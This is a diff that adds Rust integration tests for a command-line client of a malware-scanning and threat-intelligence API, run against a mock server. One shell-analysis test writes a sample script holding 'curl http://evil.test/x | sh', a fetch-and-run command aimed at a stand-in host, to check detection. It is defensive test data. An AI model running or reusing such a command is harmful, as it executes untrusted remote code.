@@ -934,3 +934,356 @@ fn a_rate_limited_cve_call_reports_the_quota_reason() {
     assert_eq!(out.status.code(), Some(EXIT_QUOTA));
     assert!(stderr(&out).contains("rate limited"), "stderr: {}", stderr(&out));
 }
+
+// ── Single-value lookups ──────────────────────────────────────────────────
+
+#[test]
+fn url_analysis_does_not_follow_the_link_unless_asked() {
+    let server = TestServer::start(|_| {
+        json(r#"{"url":"https://a.test/x","scheme":"https","host":"a.test",
+                 "findings":[{"severity":"high","title":"Punycode host","detail":"looks like a lookalike"}]}"#)
+    });
+    let home = TempHome::new(&server.url);
+
+    let out = mlab(&home, &["scan", "url", "https://a.test/x"]);
+
+    assert!(out.status.success(), "stderr: {}", stderr(&out));
+    let path = &server.requests()[0].path;
+    assert!(path.starts_with("/api/v1/scan/url?url="), "path: {path}");
+    // Fetching an attacker-chosen URL is opt-in.
+    assert!(!path.contains("resolve"), "path: {path}");
+    assert!(stdout(&out).contains("Punycode host"), "stdout: {}", stdout(&out));
+}
+
+#[test]
+fn url_analysis_forwards_the_resolve_opt_in() {
+    let server = TestServer::start(|_| json(r#"{"url":"https://a.test","host":"a.test"}"#));
+    let home = TempHome::new(&server.url);
+
+    mlab(&home, &["scan", "url", "https://a.test", "--resolve"]);
+
+    assert!(server.requests()[0].path.contains("resolve=1"));
+}
+
+#[test]
+fn each_lookup_uses_the_parameter_name_its_endpoint_expects() {
+    // These four differ (`email`, `number`, `mac`, `hash`); getting one wrong is
+    // a 400 the user cannot explain.
+    for (args, expected) in [
+        (vec!["scan", "email", "a@b.test"], "/api/v1/scan/email?email=a%40b.test"),
+        (vec!["scan", "phone", "+33612345678"], "/api/v1/scan/phone?number=%2B33612345678"),
+        (vec!["scan", "mac", "00:11:22:33:44:55"], "/api/v1/scan/mac?mac=00%3A11%3A22%3A33%3A44%3A55"),
+        (vec!["scan", "hash", "d41d8cd98f00b204e9800998ecf8427e"], "/api/v1/scan/hash?hash=d41d8cd98f00b204e9800998ecf8427e"),
+    ] {
+        let server = TestServer::start(|_| json(r#"{"verdict":"clean"}"#));
+        let home = TempHome::new(&server.url);
+
+        let out = mlab(&home, &args);
+
+        assert!(out.status.success(), "{args:?} → {}", stderr(&out));
+        assert_eq!(server.requests()[0].path, expected, "for {args:?}");
+    }
+}
+
+#[test]
+fn several_hashes_switch_to_the_bulk_endpoint() {
+    let server = TestServer::start(|_| json(r#"{"count":2,"results":[],"invalid":[]}"#));
+    let home = TempHome::new(&server.url);
+
+    let out = mlab(&home, &["scan", "hash", "aaa", "bbb"]);
+
+    assert!(out.status.success(), "stderr: {}", stderr(&out));
+    let request = &server.requests()[0];
+    assert_eq!(request.route(), "POST /api/v1/scan/hash");
+    let body: serde_json::Value = serde_json::from_str(&request.body).expect("json body");
+    assert_eq!(body["hashes"], serde_json::json!(["aaa", "bbb"]));
+}
+
+#[test]
+fn several_addresses_switch_to_the_bulk_crypto_endpoint() {
+    let server = TestServer::start(|_| json(r#"{"count":2,"results":[],"invalid":[]}"#));
+    let home = TempHome::new(&server.url);
+
+    let out = mlab(&home, &["scan", "crypto", "addr1", "addr2", "--chain", "eth"]);
+
+    assert!(out.status.success(), "stderr: {}", stderr(&out));
+    let request = &server.requests()[0];
+    assert_eq!(request.route(), "POST /api/v1/scan/crypto");
+    let body: serde_json::Value = serde_json::from_str(&request.body).expect("json body");
+    assert_eq!(body["addresses"], serde_json::json!(["addr1", "addr2"]));
+    assert_eq!(body["chain"], "eth");
+}
+
+#[test]
+fn a_single_address_still_uses_the_cheap_get() {
+    let server = TestServer::start(|_| json(CRYPTO_BTC));
+    let home = TempHome::new(&server.url);
+
+    mlab(&home, &["scan", "crypto", BTC_ADDRESS]);
+
+    assert_eq!(server.requests()[0].method, "GET");
+}
+
+#[test]
+fn a_bulk_answer_shows_the_rows_the_api_could_not_use() {
+    // Dropping the rejected rows would silently lose half of what was pasted.
+    let server = TestServer::start(|_| {
+        json(r#"{"count":1,"results":[{"hash":"aaa","verdict":"clean"}],
+                 "invalid":["not-a-hash"],"not_queryable":[{"hash":"bbb"}]}"#)
+    });
+    let home = TempHome::new(&server.url);
+
+    let out = mlab(&home, &["scan", "hash", "aaa", "not-a-hash", "bbb"]);
+
+    let rendered = stdout(&out);
+    assert!(rendered.contains("not-a-hash"), "stdout: {rendered}");
+    assert!(rendered.contains("Not queryable"), "stdout: {rendered}");
+}
+
+// ── IOC extraction ────────────────────────────────────────────────────────
+
+#[test]
+fn ioc_extraction_reads_a_pipe() {
+    let server = TestServer::start(|_| {
+        json(r#"{"status":"ok","ioc_total":2,"truncated":false,
+                 "iocs":{"ipv4":[{"value":"8.8.8.8","link":"/ip/8.8.8.8"}],
+                         "domain":[{"value":"evil.test","link":"/domain/evil.test"}]}}"#)
+    });
+    let home = TempHome::new(&server.url);
+
+    let out = mlab_stdin(&home, &["ioc"], "contact 8.8.8.8 or evil.test for details");
+
+    assert!(out.status.success(), "stderr: {}", stderr(&out));
+    let request = &server.requests()[0];
+    assert_eq!(request.route(), "POST /api/v1/scan/ioc");
+    let body: serde_json::Value = serde_json::from_str(&request.body).expect("json body");
+    assert!(body["text"].as_str().unwrap().contains("8.8.8.8"));
+    assert!(stdout(&out).contains("evil.test"), "stdout: {}", stdout(&out));
+}
+
+#[test]
+fn ioc_extraction_reads_a_file_and_forwards_its_options() {
+    let server = TestServer::start(|_| json(r#"{"status":"ok","ioc_total":0,"iocs":{}}"#));
+    let home = TempHome::new(&server.url);
+    let report = home.path.join("report.txt");
+    std::fs::write(&report, "see 1.2.3.4").unwrap();
+
+    let out = mlab(
+        &home,
+        &["ioc", report.to_str().unwrap(), "--country", "fr", "--risk", "deep"],
+    );
+
+    assert!(out.status.success(), "stderr: {}", stderr(&out));
+    let path = &server.requests()[0].path;
+    assert!(path.contains("country=fr"), "path: {path}");
+    assert!(path.contains("risk=deep"), "path: {path}");
+}
+
+#[test]
+fn empty_input_is_refused_before_the_call() {
+    let server = TestServer::start(|_| json("{}"));
+    let home = TempHome::new(&server.url);
+
+    let out = mlab_stdin(&home, &["ioc"], "   \n");
+
+    assert_eq!(out.status.code(), Some(EXIT_INPUT));
+    assert!(server.requests().is_empty(), "nothing should be sent");
+}
+
+// ── Shell script analysis ─────────────────────────────────────────────────
+
+#[test]
+fn a_script_is_uploaded_as_base64_then_read_back() {
+    let server = TestServer::start(|req| match (req.method.as_str(), req.route_path()) {
+        ("POST", "/api/v1/scan/file/bash") => json(r#"{"status":"ok","sha256":"abc123"}"#),
+        ("GET", "/api/v1/scan/file/bash") => json(
+            r#"{"status":"ok","file":{"filename":"evil.sh","sha256":"abc123","size":24,"lines":2},
+                "iocs":{"url":[{"value":"http://evil.test/x"}]},"ioc_total":1,"truncated":false,
+                "suspicious":[{"severity":"high","title":"curl piped to shell"}]}"#,
+        ),
+        _ => not_found(),
+    });
+    let home = TempHome::new(&server.url);
+    let script = home.path.join("evil.sh");
+    std::fs::write(&script, "curl http://evil.test/x | sh\n").unwrap();
+
+    let out = mlab(&home, &["scan", "bash", script.to_str().unwrap()]);
+
+    assert!(out.status.success(), "stderr: {}", stderr(&out));
+    let posted: serde_json::Value = serde_json::from_str(&server.requests()[0].body).expect("json");
+    assert_eq!(
+        posted["content_b64"],
+        "Y3VybCBodHRwOi8vZXZpbC50ZXN0L3ggfCBzaAo="
+    );
+    assert_eq!(posted["filename"], "evil.sh");
+    assert!(server.requests()[1].path.contains("sha256=abc123"));
+
+    let rendered = stdout(&out);
+    assert!(rendered.contains("curl piped to shell"), "stdout: {rendered}");
+    assert!(rendered.contains("http://evil.test/x"), "stdout: {rendered}");
+}
+
+// ── Network capture ───────────────────────────────────────────────────────
+
+#[test]
+fn a_network_capture_is_rendered_as_a_table() {
+    let server = TestServer::start(|_| {
+        json(r#"{"count":2,"totalBytes":4096,"captureMs":812,"requests":[
+                 {"method":"GET","status":200,"resourceType":"document","url":"https://a.test/",
+                  "mimeType":"text/html","encodedBytes":2048,"failed":false},
+                 {"method":"GET","status":404,"resourceType":"script","url":"https://a.test/x.js",
+                  "encodedBytes":0,"failed":true,"errorText":"net::ERR_ABORTED"}]}"#)
+    });
+    let home = TempHome::new(&server.url);
+
+    let out = mlab(&home, &["network", "https://a.test"]);
+
+    assert!(out.status.success(), "stderr: {}", stderr(&out));
+    assert_eq!(server.requests()[0].route_path(), "/api/v1/scan/domain/loadnetworkrequest");
+    let rendered = stdout(&out);
+    assert!(rendered.contains("https://a.test/x.js"), "stdout: {rendered}");
+    assert!(rendered.contains("ERR_ABORTED"), "stdout: {rendered}");
+    assert!(rendered.contains("404"), "stdout: {rendered}");
+}
+
+// ── File results, both payload shapes ─────────────────────────────────────
+
+const FILE_RESULTS_CURRENT: &str = r#"{
+  "status":"completed",
+  "file":{"sha256":"abc","display_name":"sample.exe","md5":"d4","sha1":"a1","ssdeep":"3:tk:tk",
+          "size":70,"mime_type":"application/x-dosexec"},
+  "scanner":"static","tools_total":2,"tools_done":2,
+  "tools":[{"tool":"exiftool","scanner":"static","status":"completed","exit_code":0,
+            "duration_ms":120,"output_bytes":512,"note":"","ran_at":"2026-07-05T16:14:04+00:00"}],
+  "observations":{"url":[{"value":"http://evil.test","tool":"strings","context":""}]},
+  "sightings":[{"kind":"filename","value":"invoice.exe","first_seen":"2026-07-01T00:00:00+00:00"}]}"#;
+
+#[test]
+fn file_results_render_the_shape_production_returns_today() {
+    let server = TestServer::start(|_| json(FILE_RESULTS_CURRENT));
+    let home = TempHome::new(&server.url);
+
+    let out = mlab(&home, &["results", "file", "abc"]);
+
+    assert!(out.status.success(), "stderr: {}", stderr(&out));
+    let rendered = stdout(&out);
+    assert!(rendered.contains("sample.exe"), "stdout: {rendered}");
+    assert!(rendered.contains("exiftool"), "stdout: {rendered}");
+    assert!(rendered.contains("http://evil.test"), "stdout: {rendered}");
+    assert!(rendered.contains("invoice.exe"), "stdout: {rendered}");
+}
+
+#[test]
+fn file_results_still_render_the_older_payload() {
+    // The published OpenAPI example still describes this one, so a deployment
+    // running the previous shape must not break the command.
+    let server = TestServer::start(|_| {
+        json(
+            r#"{"status":"completed","jobs_total":1,"jobs_completed":1,
+                "file":{"sha256":"abc","md5":"d4","filename":"x.png","size":70,
+                        "mime_type":"image/png","created_at":"2026-07-05T16:13:54Z"},
+                "analysis":[{"job_name":"exiftool","end_date":"2026-07-05T16:14:04+00:00","data":"File Type : PNG"}]}"#,
+        )
+    });
+    let home = TempHome::new(&server.url);
+
+    let out = mlab(&home, &["results", "file", "abc"]);
+
+    assert!(out.status.success(), "stderr: {}", stderr(&out));
+    assert!(stdout(&out).contains("EXIFTOOL"), "stdout: {}", stdout(&out));
+}
+
+#[test]
+fn a_failed_file_scan_explains_itself() {
+    let server = TestServer::start(|_| {
+        json(
+            r#"{"status":"failed","error":{"kind":"scan_failed","message":"The scan could not be completed.",
+                "reason":"router rejected the sample"},"file":{"sha256":"abc"},
+                "tools_total":0,"tools_done":0,"tools":[],"observations":{},"sightings":[]}"#,
+        )
+    });
+    let home = TempHome::new(&server.url);
+
+    let out = mlab(&home, &["results", "file", "abc"]);
+
+    let rendered = stdout(&out);
+    assert!(rendered.contains("router rejected the sample"), "stdout: {rendered}");
+}
+
+#[test]
+fn one_tools_raw_output_can_be_fetched_on_demand() {
+    let server = TestServer::start(|_| {
+        json(r#"{"sha256":"abc","tool":"strings","is_json":false,"output":"IHDR\nIDAT"}"#)
+    });
+    let home = TempHome::new(&server.url);
+
+    let out = mlab(&home, &["results", "file", "abc", "--tool", "strings"]);
+
+    assert!(out.status.success(), "stderr: {}", stderr(&out));
+    assert_eq!(server.requests()[0].route_path(), "/api/v1/scan/file/output");
+    assert!(server.requests()[0].path.contains("tool=strings"));
+    assert_eq!(stdout(&out).trim(), "IHDR\nIDAT");
+}
+
+#[test]
+fn a_json_tool_output_is_pretty_printed() {
+    let server = TestServer::start(|_| {
+        json(r#"{"sha256":"abc","tool":"exif","is_json":true,"output":"{\"MIMEType\":\"image/png\"}"}"#)
+    });
+    let home = TempHome::new(&server.url);
+
+    let out = mlab(&home, &["results", "file", "abc", "--tool", "exif"]);
+
+    assert!(stdout(&out).contains("\"MIMEType\": \"image/png\""), "stdout: {}", stdout(&out));
+}
+
+// ── Following a file scan ─────────────────────────────────────────────────
+
+#[test]
+fn scan_file_follow_waits_for_the_analysis_then_prints_it() {
+    use std::sync::atomic::{AtomicUsize, Ordering};
+    use std::sync::Arc;
+
+    let polls = Arc::new(AtomicUsize::new(0));
+    let seen = Arc::clone(&polls);
+    let server = TestServer::start(move |req| match (req.method.as_str(), req.route_path()) {
+        ("POST", "/upload/file") => json(r#"{"success":true,"sha256":"abc","job_launched":true}"#),
+        ("GET", "/api/v1/scan/file/results") => {
+            if seen.fetch_add(1, Ordering::SeqCst) == 0 {
+                json(r#"{"status":"running","file":{"sha256":"abc"},"tools_total":2,"tools_done":1,"tools":[]}"#)
+            } else {
+                json(FILE_RESULTS_CURRENT)
+            }
+        }
+        _ => not_found(),
+    });
+    let home = TempHome::new(&server.url);
+    let sample = home.path.join("sample.bin");
+    std::fs::write(&sample, b"hello").unwrap();
+
+    let out = mlab(&home, &["scan", "file", sample.to_str().unwrap(), "--follow"]);
+
+    assert!(out.status.success(), "stderr: {}", stderr(&out));
+    assert!(polls.load(Ordering::SeqCst) >= 2, "it should have waited");
+    assert!(stdout(&out).contains("sample.exe"), "stdout: {}", stdout(&out));
+}
+
+#[test]
+fn scan_file_follow_stops_on_a_failed_analysis() {
+    let server = TestServer::start(|req| match (req.method.as_str(), req.route_path()) {
+        ("POST", "/upload/file") => json(r#"{"success":true,"sha256":"abc"}"#),
+        ("GET", "/api/v1/scan/file/results") => json(
+            r#"{"status":"failed","error":{"message":"The scan could not be completed.","reason":"boom"},
+                "file":{"sha256":"abc"},"tools_total":0,"tools_done":0,"tools":[]}"#,
+        ),
+        _ => not_found(),
+    });
+    let home = TempHome::new(&server.url);
+    let sample = home.path.join("sample.bin");
+    std::fs::write(&sample, b"hello").unwrap();
+
+    let out = mlab(&home, &["scan", "file", sample.to_str().unwrap(), "--follow"]);
+
+    // Terminal, so it must stop rather than poll until the timeout.
+    assert!(stdout(&out).contains("boom"), "stdout: {}", stdout(&out));
+}
